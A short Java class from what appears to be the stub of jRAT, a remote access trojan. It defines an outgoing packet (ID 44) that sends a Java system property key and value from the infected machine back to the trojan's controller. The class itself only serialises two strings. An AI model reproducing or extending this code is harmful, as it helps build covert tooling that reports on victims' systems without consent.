package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet44SystemJavaProperty extends AbstractOutgoingPacket {

	private String key;
	private String value;

	public Packet44SystemJavaProperty(String key, String value) {
		this.key = key;
		this.value = value;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(key);
		sw.writeLine(value);
	}

	@Override
	public short getPacketId() {
		return 44;
	}

}
